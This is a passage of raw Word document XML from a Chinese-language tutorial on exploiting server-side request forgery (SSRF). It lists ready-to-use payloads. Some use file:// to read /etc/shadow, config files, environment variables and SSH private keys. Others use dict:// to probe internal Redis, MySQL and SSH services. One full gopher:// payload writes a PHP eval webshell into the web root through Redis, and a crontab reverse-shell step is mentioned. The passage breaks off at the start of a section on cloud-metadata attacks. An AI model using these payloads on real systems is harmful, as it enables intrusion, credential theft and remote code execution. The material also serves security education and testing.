        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>端口开放，有服务在运行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54221E1D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返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>页面内容</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务，可以进一步利用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BEA2E54" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>四、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>协议利用详解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220026A8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的强大之处在于不</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>局限于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP/HTTPS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>。很多后端语言</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>库支持多种协议，这些协议可以被利用来扩展攻击面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD7C236" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">4.1 file:// - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>读取本地文件</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="424280E3" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>最直接最简单的利用方式。如果服务器端使用了可读取文件的函数（如</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PHP </w:t>
      </w:r>
      <w:r>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file_get_contents()</w:t>
      </w:r>
      <w:r>
        <w:t>），可以通过</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file:// </w:t>
      </w:r>
      <w:r>
        <w:t>协议读取服务器上的任意文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C575444" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">Linux </w:t>
      </w:r>
      <w:r>
        <w:t>常见目标：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D487957" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=file:///etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3063C0C5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>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>=file:///etc/shadow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE707F3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>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>=file:///var/www/html/config.php    #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>数据库配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2328F2EF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">=file:///proc/self/environ          # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>环境变量</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="74FC85D3" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">?url=file:///proc/self/cmdline          # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>进程启动参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A6E90A" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">Windows </w:t>
      </w:r>
      <w:r>
        <w:t>常见目标：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C46E200" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=file:///C:/Windows/System32/drivers/etc/hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6658EAC5" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=file:///C:/inetpub/wwwroot/web.config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C33806C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=file:///C:/Users/Administrator/.ssh/id_rsa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED2AEE9" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
        </w:rPr>
        <w:t xml:space="preserve">[!] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
        </w:rPr>
        <w:t>注意：能读到什么文件取决于服务进程的运行权限（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
        </w:rPr>
        <w:t>www-data / root / SYSTEM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
        </w:rPr>
        <w:t>）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538D0E44" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">4.2 dict:// - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务探测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65691693" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>dict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协议原用于访问字典服务器，但可以用来探测内网端口和服务信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B93F75F" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">=dict://127.0.0.1:6379/info       # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>获取</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> Redis </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4685B58D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">?url=dict://127.0.0.1:3306/status    # MySQL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>状态</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1292CB5A" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=dict://127.0.0.1:22/            # SSH Banner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248FE91B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">dict </w:t>
      </w:r>
      <w:r>
        <w:t>协议的优点是：即使目标服务不是</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTTP</w:t>
      </w:r>
      <w:r>
        <w:t>，也能通过响应内容判断服务类型。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEE6722" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3 gopher:// - </w:t>
      </w:r>
      <w:r>
        <w:t>构造任意</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> TCP </w:t>
      </w:r>
      <w:r>
        <w:t>包（最强大）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F75147" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">gopher </w:t>
      </w:r>
      <w:r>
        <w:t>协议是</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>中威力最大的协议。它可以构造任意</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> TCP </w:t>
      </w:r>
      <w:r>
        <w:t>数据包，相当于可以通过</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>与内网的任何</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> TCP </w:t>
      </w:r>
      <w:r>
        <w:t>服务交互。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F5E70A" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>典型利用场景</w:t>
      </w:r>
      <w:r>
        <w:t>——</w:t>
      </w:r>
      <w:r>
        <w:t>攻击内网</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:t>（需要</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Gopherus </w:t>
      </w:r>
      <w:r>
        <w:t>工具生成</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Payload</w:t>
      </w:r>
      <w:r>
        <w:t>）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AD20BB" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>写入</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Webshell </w:t>
      </w:r>
      <w:r>
        <w:t>到</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r>
        <w:t>目录：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCD8551" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22%3C%3Fphp%20eval(%24_POST%5Bcmd%5D)%3B%3F%3E%22%0d%0aSAVE%0d%0a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10805709" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>写入</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Crontab</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>反弹</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Shell</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2697A93F" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=gopher://127.0.0.1:6379/_[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>复杂</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>命令，推荐用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Gopherus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23449979" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>也可以通过</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gopher </w:t>
      </w:r>
      <w:r>
        <w:t>攻击内网的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> MySQL</w:t>
      </w:r>
      <w:r>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:t>SMTP</w:t>
      </w:r>
      <w:r>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">FTP </w:t>
      </w:r>
      <w:r>
        <w:t>等</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> TCP </w:t>
      </w:r>
      <w:r>
        <w:t>服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C08AA8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4 </w:t>
      </w:r>
      <w:r>
        <w:t>其他协议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587"/>
        <w:gridCol w:w="2557"/>
        <w:gridCol w:w="3712"/>
      </w:tblGrid>
      <w:tr w:rsidR="002E49D8" w14:paraId="20C79CFD" w14:textId="77777777" w:rsidTr="002E4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93FE64" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:r>
              <w:t>协议</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A92EE02" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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用途</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="21C1BEF6" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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示例</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002E49D8" w14:paraId="577C594D" w14:textId="77777777" w:rsidTr="002E4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DE638A" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:r>
              <w:t>ftp://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="029D5F82" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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访问</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> FTP </w:t>
            </w:r>
            <w:r>
              <w:t>服务</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A659E72" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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?url=ftp://anonymous@10.0.0.1:21</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002E49D8" w14:paraId="4E34AC04" w14:textId="77777777" w:rsidTr="002E49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7AC04E" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:r>
              <w:t>ldap://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7830484C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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访问</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
              <w:t xml:space="preserve"> LDAP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
              <w:t>目录服务</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6F529540" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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?</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>url</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:t>=ldap://10.0.0.1:389</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002E49D8" w14:paraId="0F163A5B" w14:textId="77777777" w:rsidTr="002E4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B7E15B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:r>
              <w:t>sftp://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A4D39FA" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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SSH </w:t>
            </w:r>
            <w:r>
              <w:t>文件传输</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4FB5DE19" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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?url=sftp://10.0.0.1:22</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002E49D8" w14:paraId="43FB4FDC" w14:textId="77777777" w:rsidTr="002E49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C95D4B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:r>
              <w:t>tftp://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="620CF4D7" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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TFTP </w:t>
            </w:r>
            <w:r>
              <w:t>服务</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2619B9D8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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?url=tftp://10.0.0.1:69</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002E49D8" w14:paraId="5608B52D" w14:textId="77777777" w:rsidTr="002E4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339433" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:r>
              <w:t>phar://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="24C923DF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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PHP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
              <w:t>反序列化（配合文件上传）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5371F674" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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  <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>url</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:t>=phar://test.zip/test.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="271B74E9" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>五、</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>云服务</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>攻击（最危险）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6360E842" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>这是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>最危险的利用场景</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>——</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>通过</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>云服务</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的内网</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
